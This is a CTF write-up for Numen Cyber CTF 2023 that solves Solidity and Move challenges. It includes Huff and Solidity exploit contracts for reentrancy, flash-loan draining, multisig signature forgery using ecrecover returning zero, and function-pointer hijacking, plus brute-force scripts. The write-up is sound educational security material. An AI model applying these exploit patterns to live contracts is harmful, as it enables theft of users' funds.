
# Numen Cyber CTF Writeups

Numen Cyber CTF 2023 is a CTF hosted by [Numen Cyber](https://twitter.com/numencyber) that included challenges on Solidity and Move.
The official repository is here: https://github.com/numencyber/NumenCTF_2023.

The challenges I solved during the contest are as follows. 

**Table of Contents**
- [Solidity](#solidity)
  - [ASSLOT](#asslot)
  - [LittleMoney](#littlemoney)
  - [GOATFinance](#goatfinance)
  - [LenderPool](#lenderpool)
  - [HEXP](#hexp)
  - [Counter](#counter)
  - [Wallet](#wallet)
  - [Exist](#exist)
  - [SimpleCall](#simplecall)
- [Move](#move)
  - [Move to Crackme](#move-to-crackme)
  - [ChatGPT tell me where is the vulnerability](#chatgpt-tell-me-where-is-the-vulnerability)
  - [Move to Checkin](#move-to-checkin)

## Solidity

### ASSLOT

[Source](ASSLOT)

>Can you make caller to operate slot? if not, it's ass caller

The goal of this challenge is to emit an `EmitFlag` event.
The `f00000000_bvvvdlt` function needs to be called for emitting it, but the code size of the caller must be less than 64 bytes.

```solidity
    function f00000000_bvvvdlt() external {
        assembly {
            let size := extcodesize(caller())
            if gt(size, shl(0x6, 1)) { invalid() }
        }
        func();
        emit EmitFlag(tx.origin);
    }
```

Also, `func()` is called, and the following checks are performed in it.

```solidity
assembly {
    for { let i := 0 } lt(i, 0x4) { i := add(i, 1) } {
        mstore(0, blockhash(sub(number(), 1)))
        let success := staticcall(gas(), caller(), 0, shl(0x5, 1), 0, 0)
        if eq(success, 0) { invalid() }
        returndatacopy(0, 0, shl(0x5, 1))
        switch eq(i, mload(0))
        case 0 { invalid() }
    }
}
```

The `staticcall` is executed for the caller in this assembly block.
The argument is the latest block hash.
The `for` statement is used, and `staticcall` is executed four times with `i` from `0` to `3`.
If any of the four `staticcall`s are not successful, `invalid()` is executed, and the transaction is reverted.
The return value of the `staticcall` must then match `i`.

It is necessary to write a contract that satisfies the above conditions.
The Huff language can be used to meet strict code size limits.

The most difficult of the above conditions is to match the return value of `staticcall` with `i`.
Since the state cannot be changed by `staticcall`, some external data must be obtained in the called contract, and `i` must be inferred from them.
This is easily solved by using the `GAS` opcode.
As the loop proceeds, the remaining gas decreases, and `i` can be estimated based on that.
The `GAS` consumed in one loop can be measured locally and hard-coded into the contract.

The code of the solver is below.
Since errors are troublesome, it is easier to insert an opcode that consumes more gas (such as `BALANCE`) as appropriate.

```cpp
#define constant ASSLOT_ADDRESS = 0x00F48be067bE3f74e623A101eE166200D7a2D238

#define macro MAIN() = takes (0) returns (0) {
    calldatasize func jumpi    

    returndatasize 
    returndatasize           
    0x04            // argsSize
    returndatasize
    returndatasize 
    [ASSLOT_ADDRESS]
    gas             // [gas, ASSLOT_ADDRESS, 0x00, 0x00, 0x04, 0x00, 0x00]
    call            // []
    returndatasize returndatasize return

    func:

    // for consuming gas
    returndatasize 
    balance
    balance

    0x1c3           // [0x1c3]
    0x154b7         // [0x154b7, 0x1c3]
    gas             // [gas, 0x154b7, 0x1c3]
    sub             // [gas - 0x154b7, 0x1c3]
    div             // [(gas - 0x154b7) / 0x1c3]
    0x03            // [0x03, (gas - 0x154b7) / 0x1c3]
    sub             // [i := 0x03 - (gas - 0x154b7) / 0x1c3]
    0x00 mstore
    0x20 0x00 return
}
```

Flag: `0x7ade4f46b38a3cb0b879b1c26e23c34eae81b210`

### LittleMoney

[Source](LittleMoney)

>Just pay a little money for the flag

The goal of this challenge is to emit a `SendFlag` event.
This event can be emitted in the `payforflag` function.

```solidity
    function payforflag() public payable onlyOwner {
        require(msg.value == 1, "I only need a little money!");
        emit SendFlag(msg.sender);
    }
```

However, the `payforflag` function can only be called by the owner.
Then, how can a `SendFlag` event be emitted?
The following `execute` function can be used to indirectly emit it.

```solidity
    function execute(address target) external checkPermission(target) {
        (bool success,) = target.delegatecall(abi.encode(bytes4(keccak256("func()"))));
        require(!success, "no cover!");
        uint256 b;
        uint256 v;
        (b, v) = getReturnData();
        require(b == block.number);

        func memory set;
        set.ptr = renounce;
        uint x;
        assembly {
            x := mload(set)
            mstore(set, add(mload(set), v))
        }
        set.ptr();
    }
```

The function can execute a `delegatecall` on any address `target`. The `delegatecall` must be reverted, and the return data `b`,`v` will be obtained.
`b` must be a block number.
`v` is used in `mstore(set, add(mload(set), v))`.

Also, the `target` must satisfy the `checkPermission` modifier. Its conditions are as follows.

```solidity
    modifier checkPermission(address addr) {
        _;
        permission(addr);
    }

    function permission(address addr) internal view {
        bool con = calcCode(addr);
        require(con, "permission");
        require(msg.sender == addr);
    }

    function calcCode(address addr) internal view returns (bool) {
        uint256 x;
        assembly {
            x := extcodesize(addr)
        }
        if (x == 0) {
            return false;
        } else if (x > 12) {
            return false;
        } else {
            assembly {
                return(0x20, 0x00)
            }
        }
    }
```

It must satisfy `msg.sender == target` and `0 < extcodesize(target) <= 12`.
`set` is the following structure, with the function pointer `ptr` inside.

```solidity
    struct func {
        function() internal ptr;
    }
```

The `set.ptr` stores the address of the `renounce` function.
The `v` is added to the `set.ptr` by `mstore(set, add(mload(set), v))`.
If `v` is set to an appropriate value, it is possible to set the program counter to an address that is not the `renounce` function and emit a `SendFlag` event.
The actual function pointer is the `JUMPDEST` address.
Thus, it can be jumped to any `JUMPDEST` address.

The `payforflag` function has the condition `require(msg.value == 1, "I only need a little money!");`.
However, the `execute` function is not `payable` and cannot satisfy this condition.
This means that the `JUMPDEST` address just before `emit SendFlag(msg.sender);` must be set as the program counter.

Find the `JUMPDEST` addresses of the `renounce` and `payforflag` functions. (Use [erever](https://github.com/minaminao/erever).)

```
erever -b $(cast code $INSTANCE_ADDRESS)
```

The `JUMPDEST` address of the `renounce` function is as follows.

```
0x22a: JUMPDEST
0x22b: PUSH1 0x00
0x22d: SLOAD
0x22e: PUSH1 0x01
0x230: PUSH1 0x01
0x232: PUSH1 0xa0
0x234: SHL
0x235: SUB
0x236: AND
0x237: PUSH2 0x023f
```

The `JUMPDEST` address of the `payforflag` function is as follows.

```
0x1a5: JUMPDEST
0x1a6: CALLVALUE
0x1a7: PUSH1 0x01
0x1a9: EQ
0x1aa: PUSH2 0x01f5
0x1ad: JUMPI
```

This is the process that checks for the `msg.value == 1` condition mentioned earlier. If the condition is satisfied, it jumps to `0x1f5`.

```
0x1f5: JUMPDEST
0x1f6: PUSH1 0x40
0x1f8: MLOAD
0x1f9: CALLER
0x1fa: DUP2
0x1fb: MSTORE
0x1fc: PUSH32 0x2d3bd82a572c860ef85a36e8d4873a9deed3f76b9fddbf13fbe4fe8a97c4a579
```

By setting the program counter to `0x1f5`, it can be seen that the `SendFlag` event can be emitted.
Then, what value should `v` be set to?

The `JUMPDEST` address in `renounce` stored in `set.ptr` is `0x22a`, and the address to jump to is `0x1f5`.
Thus, `v` needs to be `0x1f5 - 0x22a = - 0xcb`.

However, the problem is that the size of the deployed contract must be less than 12 bytes.
Storing a negative value requires many bytes, as in `PUSHx 0xffff..cb`.
Reading the disassembled result, `PUSH4 0xffffffcb` is sufficient, but it still does not meet the 12-byte limit.

For this reason, instead of using `PUSH`, I decided to store the negative value in another space in advance and get it.
There are several ways to do this, but this time I sent `0xffffffcb` wei to address `GASPRICE()` so that I could get `0xffffffcb` in `BALANCE(GASPRICE())`.

Therefore, deploying the following contract and calling `execute` can emit a `SendFlag` event.

```cpp
#define macro MAIN() = takes (0) returns (0) {
    gasprice balance 0x20 mstore 
    number callvalue mstore
    0x40 callvalue revert
}
```

Flag: `77496328-ab8d-4bf7-a918-3d1f7ad5c5ac`

### GOATFinance

[Source](GOATFinance)

>How to become a G.O.A.T in DIFI world?

The goal of this challenge is to raise the token balance of `msg.sender` to at least `10000000`.

The token can be transferred by calling the `_transfer` function in the `transfer` function.

```
uint256 _fee = amount * transferRate / 100;
_transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
```

The `ReferrerFees` and `transferRate` can be set with the following `DynamicRew` function.

```solidity
    function DynamicRew(address _msgsender, uint256 _blocktimestamp, uint256 _ReferrerFees, uint256 _transferRate)
        public
        returns (address)
    {
        require(_blocktimestamp < 1677729610, "Time mismatch");
        require(_transferRate <= 50 && _transferRate <= 50);
        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));
        address a = ecrecover(_hash, v, r, s);
        require(a == admin && time < _blocktimestamp, "time or banker");
        ReferrerFees = _ReferrerFees;
        transferRate = _transferRate;
        return a;
    }
```

The `_msgsender` and `_blocktimestamp` need to be set appropriately to satisfy the above conditions. The `_blocktimestamp` can only be either `time+1` or `time+2`, since `uint256 public time = 1677729607;`. Also, there seems to be a `_msgsender`, whose address is defined by `string msgsender = "0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0";`. However, `0x71fA690CCCDC285E3Cb6d5291EA935cfdfE4E0` is 39 bytes, one byte short.

Assuming that this address is missing one byte, brute-forcing the correct address reveals that it is `0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053`.

Therefore, execute the following exploit and the `setflag` function.

```solidity
contract Exploit {
    function exploit(address instanceAddress) public {
        PrivilegeFinance finance = PrivilegeFinance(instanceAddress);
        uint256 amount = 1000;
        finance.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 20000000 / amount * 100, 50);
        finance.Airdrop();
        finance.deposit(address(0), 1, msg.sender);
        finance.transfer(finance.admin(), 999);
    }
}
```

Flag: `0x4c7d8e17af758ca2054f6c1c6ea4535387352aeb`

### LenderPool

[Source](LenderPool)

>If you are poor, go to the lenderPool.

The goal of this challenge is to drain all `token0` in the pool.

The pool implements the following `swap` and `flashLoan` functions.

```solidity
    function swap(address tokenAddress, uint256 amount) public returns (uint256) {
        require(
            tokenAddress == address(token0) && token1.transferFrom(msg.sender, address(this), amount)
                && token0.transfer(msg.sender, amount)
                || tokenAddress == address(token1) && token0.transferFrom(msg.sender, address(this), amount)
                    && token1.transfer(msg.sender, amount)
        );
        return amount;
    }

    function flashLoan(uint256 borrowAmount, address borrower) external nonReentrant {
        uint256 balanceBefore = token0.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token0.transfer(borrower, borrowAmount);
        borrower.functionCall(abi.encodeWithSignature("receiveEther(uint256)", borrowAmount));

        uint256 balanceAfter = token0.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

The `swap` function cannot be executed because the token balance is zero. Thus, the first step is to execute the `flashLoan` function.

In the `flashLoan` function, the `receiveEther` function is called. During that call, by executing the `swap` function, the full amount of `token0` can be swapped to `token1`. Next, `token1` can be `swapped` to `token0` to drain all `token0` from the pool.

Therefore, execute the following contract.

```solidity
contract Exploit {
    LenderPool lenderPool;

    function exploit(address lenderPoolAddress) public {
        lenderPool = LenderPool(lenderPoolAddress);
        lenderPool.token0().approve(lenderPoolAddress, 100 * 10 ** 18);
        lenderPool.token1().approve(lenderPoolAddress, 100 * 10 ** 18);
        lenderPool.flashLoan(100 * 10 ** 18, address(this));
        lenderPool.swap(address(lenderPool.token0()), 100 * 10 ** 18);
    }

    function receiveEther(uint256 amount) public {
        lenderPool.swap(address(lenderPool.token1()), amount);
    }
}
```

Flag: `0xf4ea28f40bd256f743544e2c55e00f14701ee20e`

### HEXP

[Source](HEXP)

>Not only hex but also pump.

The goal of this challenge is the successful execution of the following `f00000000_bvvvdlt` function.

```solidity
    function f00000000_bvvvdlt() external {
        (bool succ, bytes memory ret) = target.call(hex"");
        assert(succ);
        flag = true;
    }
```

The `target` stores the address of the contract to be created in the constructor with the bytecode `code`.

```solidity
    constructor() {
        bytes memory code = hex"3d602d80600a3d3981f362ffffff80600a43034016903a1681146016576033fe5b5060006000f3";
        address child;
        assembly {
            child := create(0, add(code, 0x20), mload(code))
        }
        target = child;
    }
```

As a result of contract creation, its bytecode is `62ffffff80600a43034016903a1681146016576033fe5b5060006000f3`. Parsing this bytecode gives the following result.

```
$ erever -b 62ffffff80600a43034016903a1681146016576033fe5b5060006000f3 --symbolic
0x12: JUMPI(0x16, ((BLOCKHASH((NUMBER() - 0x0a)) & 0xffffff) == (GASPRICE() & 0xffffff)))
0x15: INVALID()
0x16: JUMPDEST
0x17: POP(0x33)
0x1c: RETURN(0x00, 0x00)
```

If the result of `((BLOCKHASH((NUMBER() - 0x0a)) & 0xffffff) == (GASPRICE() & 0xffffff))` is `0`, the `INVALID` opcode is executed and `assert(succ);` in the `f000000_bvvvdlt` function will fail. Thus, this condition needs to be satisfied.

Since the block hash before `0x0a` can be easily obtained, it is sufficient to calculate the corresponding `GASPRICE` and try several transactions until they succeed.

### Counter

[Source](Counter)

>to be an emotionless counter.

The goal of this challenge is to successfully execute the following function.

```solidity
   function A_delegateccall(bytes memory data) public {
        (bool success, bytes memory returnData) = target.delegatecall(data);
        require(owner == msg.sender);
        flag = true;
    }
```

The `owner` must be `msg.sender`. At address `target`, any contract with a creation code of 24 bytes or less can be deployed using the following `create` function.

```solidity
    function create(bytes memory code) public {
        require(code.length <= 24);
        target = address(new Deployer(code));
    }

```

Since `delegatecall` shares the context, setting the value of storage slot `0` to the transaction originator or the message sender will satisfy `owner == msg.sender`.

Therefore, pass the following contract written in Huff to the `create` function.

```cpp
#define macro MAIN() = takes (0) returns (0) {
    origin 
    0x00
    sstore 
    0x00 0x20 return
}
```

### Wallet

[Source](Wallet)

>How to get money from Multi-sig wallet?

The goal of this challenge is to drain all the tokens the contract has. The following `transferWithSign` function needs to be executed successfully to drain them.

```solidity
    function transferWithSign(address _to, uint256 _amount, SignedByowner[] calldata signs) external {
        require(address(0) != _to, "Please fill in the correct address");
        require(_amount > 0, "amount must be greater than 0");
        uint256 len = signs.length;
        require(len > (owners.length / 2), "Not enough signatures");
        Holder memory holder;
        uint256 numOfApprove;
        for (uint256 i; i < len; i++) {
            holder = signs[i].holder;
            if (holder.approve) {
                // Prevent zero address
                require(checkSinger(holder.user), "Signer is not wallet owner");
                verifier.verify(_to, _amount, signs[i]);
            } else {
                continue;
            }
            numOfApprove++;
        }
        require(numOfApprove > owners.length / 2, "not enough confirmation");
        IERC20(token).approve(_to, _amount);
        IERC20(token).transfer(_to, _amount);
    }

```

The `owners` are the following five addresses, and the token can be transferred by gathering the valid signatures of a majority of the `owners`.

```solidity
    function initWallet() private {
        owners.push(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
        owners.push(address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2));
        owners.push(address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db));
        owners.push(address(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB));
        owners.push(address(0x617F2E2fD72FD9D5503197092aC168c91465E7f2));
    }
```

The `verify` function is as follows.

```solidity
contract Verifier {
    function verify(address _to, uint256 _amount, SignedByowner calldata scoupon) public {
        Holder memory holder = scoupon.holder;
        Signature memory sig = scoupon.signature;
        bytes memory serialized = abi.encode(_to, _amount, holder.approve, holder.reason);

        require(
            ecrecover(
                keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", serialized)), sig.v, sig.rs[0], sig.rs[1]
            ) == holder.user,
            "Invalid signature"
        );
    }
}
```

First, I checked the addresses of the `owners` and found that these are the initial addresses of Remix and that the secret key is known (see [reference](https://github.com/ethereum/remix-project/blob/d13fea7e8429436de6622d855bf75688c664a956/libs/remix-simulator/src/methods/accounts.ts)).
Thus, it is easy to forge signatures. However, when I executed an exploit that used forged signatures, it failed.

I found out why it failed: in the `verify` function, the `holder.user` was set to `0`. This is a bug that existed by Solidity 0.8.15, ["Head Overflow Bug in Calldata Tuple ABI-Reencoding"](https://blog.soliditylang.org/2022/08/08/calldata -tuple-reencoding-head-overflow-bug/). Actually, the version of this source code is set at `pragma solidity 0.8.15;`.

Then, how can the `require` statement be satisfied? The signature `v` given in this `verify` function can be set to any value. If the `v` of the signature is an inappropriate value, the return value of `ecrecover` can be `0`.
This can be used to satisfy the `require` statement.

Therefore, write the following contraption. As a result, the private keys of `owners` are not needed.

```solidity
contract Exploit {
    function exploit(address instanceAddress) public {
        Wallet wallet = Wallet(instanceAddress);

        address[] memory owners = new address[](5);
        owners[0] = address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
        owners[1] = address(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
        owners[2] = address(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db);
        owners[3] = address(0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB);
        owners[4] = address(0x617F2E2fD72FD9D5503197092aC168c91465E7f2);

        uint256 amount = 100 * 10 ** 18;
        address to = address(0x1337);

        SignedByowner[] memory signs = new SignedByowner[](5);
        for (uint256 i = 0; i < 5; i++) {
            signs[i] = SignedByowner(Holder(owners[i], "", true, ""), Signature(17, [bytes32(0), bytes32(0)]));
        }

        wallet.transferWithSign(address(this), 100 * 10 ** 18, signs);
    }
}
```

Flag: `0x4c7d8e17af758ca5204f61c16ea4353387352aeb`

### Exist

[Source](Exist)

>Was vernünftig ist, das ist wirklich; und was wirklich ist, das ist vernünftig. ——G. W. F. Hegel

The goal of this challenge is to set `flag` to `true` by executing the following `setflag` function.

```solidity
    function setflag() external {
        if (balanceOf[msg.sender] >= totalSupply) {
            flag = true;
        }
    }
```

To set `flag` to `true`, the token balance of `msg.sender` needs to be greater than or equal to `totalSupply`. The following `share_my_valut` can be used to satisfy this.

```solidity
    function share_my_vault() external only_EOA(msg.sender) only_family {
        uint256 add = balanceOf[address(this)];
        _transfer(address(this), msg.sender, add);
    }
```

This function can only be called from EOAs and must meet the condition of the `only_family` modifier. The `only_family` modifier executes the following `is_my_family` function with `msg.sender` as an argument.

```solidity
    function is_my_family(address account) internal returns (bool) {
        bytes20 you = bytes20(account);

        bytes20 code = maskcode;
        bytes20 feature = appearance;

        for (uint256 i = 0; i < 34; i++) {
            if (you & code == feature) {
                return true;
            }

            code <<= 4;
            feature <<= 4;
        }
        return false;
    }
```

For this function to return `true`, part of the address of `msg.sender` must contain `5a54`. Such an address and its corresponding private key can be generated by brute force using a tool such as profanity2, but a Python script using web3.py is also fast enough for this challenge to compute them as follows.

```py
from web3.auto import w3

while True:
    account = w3.eth.account.create()
    private_key = account.key
    address = account.address

    if "5a54" in address:
        print("Private Key: ", private_key.hex())
        print("Address: ", address)
        break
```

All that remains is to just run `share_my_valut` and `setflag` using the account.

Flag: `0x58c71576485889cc367b4cb238ab719c3c2f7f70`

### SimpleCall

[Source](SimpleCall)

>If you want money, call me simply!

Do a reentrancy attack against the `privilegedborrowing` function.

```solidity
contract Exploit {
    IExistingStock stock;

    function exploit(address instanceAddress) public {
        stock = IExistingStock(instanceAddress);
        stock.privilegedborrowing(1000, address(0), address(this), "");
        stock.privilegedborrowing(
            1000,
            address(0),
            address(stock),
            abi.encodePacked(bytes4(keccak256("approve(address,uint256)")), abi.encode(address(this), uint256(200001)))
        ); 
        stock.setflag();
    }

    fallback() external {
        stock.privilegedborrowing(
            1000,
            address(0),
            address(stock),
            abi.encodePacked(bytes4(keccak256("transfer(address,uint256)")), abi.encode(address(this), uint256(200001)))
        );
    }
}
```

Flag: `0xda0b5e252cfd5b31e5849642f549134fb5304d6c`


<!--
### ApplePool

>Apple pool give you apple but not approval.

### MerkleCounter

>to be an emotionless Merkle Tree.

### ZKProof

>Zero knowledge proof is not a unknowledgeable proof.

### Winner

>Hey guys, this is Counter-kill Time now! Get the WinnerNFT, you may be the king!

### Clutch Goal

>It's Clutch Goal Time! A hacker master is the one who can control most of money in the world!
-->

## Move

### Move to Crackme

[Source](MoveToCrackme)

>This challenge need you familiar with Move lanuage and linux binary crackme. For solve this challenge you need Linux x86-64 system.
>
>How to get the flag
>
>1.first download (https://github.com/move-language/move) and compile the Move lanuage
>
>2.download this package and cd in the root directory, build the package:
>
>  `move build`
>
>3.publish the package:
>
>  `move sandbox publish -v`
>
>4.you should complete the PoC.move ,and run the command :
>
>  `move sandbox run ./sources/PoC.move --signers 0xf`
>
>5.if the code implemented in PoC.move is right, it will debug print a vector stream (named out_elf) (in ./sources/MoveToCrackme.move at function core1) ,which is a crackme stream actually. First you should convert the out_elf data to hex stream and then write the stream to a file and crack this crackme on linux system(x86-64) and then get the flag

The goal of this challenge is to analyze the given Move module for suitable arguments `buffer1` and `data2` to be given to the `ctf_decrypt` function and then reverse engineer the output Linux executable.

First, find `buffer1` and `data2`. This is obtained by the following brute-force script in less than a second. The variable names are very different from `MoveToCrackme.move` (e.g., `a` is renamed to `b`).

```py
    B = []
    for b11, b12, b13 in itertools.product(range(29), repeat=3):
        ok = True
        for i in range(0, 9, 3):
            a11 = X[i]
            a21 = X[i+1]
            a31 = X[i+2]
            c11 = ( (b11 * a11) + (b12 * a21) + (b13 * a31) ) % 29
            if encrypted_flag[i] != c11:
                ok = False
                break
        if ok:
            count += 1
            assert count == 1
            B.extend([b11, b12, b13])
    (snip)
    A = []
    for k in range(len(encrypted_flag) // 3 - 3):
        count = 0
        for a1, a2, a3 in itertools.product(range(29), repeat=3):
            i = 9 + k * 3
            a11 = a1
            a21 = a2
            a31 = a3
            c11 = ( (b11 * a11) + (b12 * a21) + (b13 * a31) ) % 29
            c21 = ( (b21 * a11) + (b22 * a21) + (b23 * a31) ) % 29
            c31 = ( (b31 * a11) + (b32 * a21) + (b33 * a31) ) % 29
            if encrypted_flag[i] != c11 or encrypted_flag[i + 1] != c21 or encrypted_flag[i + 2] != c31:
                continue
            count += 1
            assert count == 1
            A.extend([a1, a2, a3])
```

`A` is `buffer1` and `B` is `data2` (or `buffer2`).

Then, write the following PoC to get the binary.

```
script {
    use 0x3::encode;
    use std::debug;

    fun test_script(account: signer) {

        // ===========================MoveToCrackMe==========================================================
        // Write the PoC here to decrypt the encrypted_steam :) get the right crackme stream. Good luck.
        // ==================================================================================================

        let buffer1: vector<u64> = vector[4, 6, 26, 10, 8, 16, 26, 26, 21, 18, 0, 23, 2, 6, 10, 14, 12, 5, 15, 5, 14, 19, 4, 6, 11, 1, 21, 3, 12, 12, 22, 15, 4, 0, 1, 14, 5, 5, 11, 11, 19, 0, 28, 11, 10, 19, 8, 1, 11, 12, 1, 21, 21, 9, 2, 3, 12, 15, 12, 3, 3, 11, 27];
        let buffer2: vector<u64> = vector[6, 12, 2, 10, 6, 23, 4, 21, 3];
        encode::ctf_decrypt(buffer1, buffer2, account)
    }
}
```

For some reason, the 33rd index value is broken, so fixing that will give the correct Linux executable. All that remains is to reverse it. It turns out that the `giveflag` function outputs the flag, and by parsing it, the following Python script shows the flag.

```py
esi = b"%\x00\x00\x00+\x00\x00\x00 \x00\x00\x00&\x00\x00\x00:\x00\x00\x00,\x00\x00\x004\x00\x00\x00\"\x00\x00\x00\'\x00\x00\x00\x1e\x00\x00\x001\x00\x00\x00$\x00\x00\x005\x00\x00\x00$\x00\x00\x001\x00\x00\x002\x00\x00\x00(\x00\x00\x00-\x00\x00\x00&\x00\x00\x00\x1e\x00\x00\x005\x00\x00\x00$\x00\x00\x001\x00\x00\x008\x00\x00\x00\x1e\x00\x00\x00(\x00\x00\x00#\x00\x00\x00 \x00\x00\x00\x1e\x00\x00\x006\x00\x00\x00.\x00\x00\x006\x00\x00\x00<\x00\x00\x00\xbf\xff\xff\xff"

for i in range(0x100):
    flag = ""
    for j in range(0x22):
        flag += chr(esi[4 * j] + i)

    print(i, flag.encode())
```

Flag: `much_reversing_very_ida_wow`

### ChatGPT tell me where is the vulnerability

[Source](ChatGPT10)

>The attachment is a move bytecode file, which can trigger the vulnerability in MoveVm. Imagine you are ChatGPT10, pls tell me which commit hash(https://github.com/move-language/move) to fix the vulnerability .NOTE: you have only one chance and the hash have no '0x' prefix

The goal of this challenge is to find the commit message that fixes the Move vulnerability executed by the attachment exploit.

The following article comes up by searching for the Move vulnerability. It is an article written by Numen Cyber, the organizer of this CTF, and it contains the exploit in the attached file.

https://medium.com/numen-cyber-labs/analysis-of-the-first-critical-0-day-vulnerability-of-aptos-move-vm-8c1fd6c2b98e

There is a link to the commit at the end of this article.

https://github.com/move-language/move/commit/566ace5a9ec01e0e685f4bfba79072fe635a6cb2

Flag: `566ace5a9ec01e0e685f4bfba79072fe635a6cb2`

### Move to Checkin

[Source](MoveToCheckin)

>Welcome to NumenCTF!
>
>Tips: use v0.27 client

The goal of this challenge is to emit a `Flag` event by executing the following `HelloHackers` function in the `checkin` module.

```
    public entry fun HelloHackers(buffer: vector<u8>,ctx: &mut TxContext) {
        let h=buffer;
        let value=b"hello";
        if(h == value){
            event::emit(Flag {
                user: tx_context::sender(ctx),
                flag: true
            });
        }
    }
```
Run `sui client call --package 0x79963c50d03d84c624d2da2d665a0920f137cf58 --module "checkin" --function "HelloHackers" --args "hello" --gas-budget 1000`.

Flag: `0xa42b74e153b78f8ccdabb2c5925ab86496e68d96`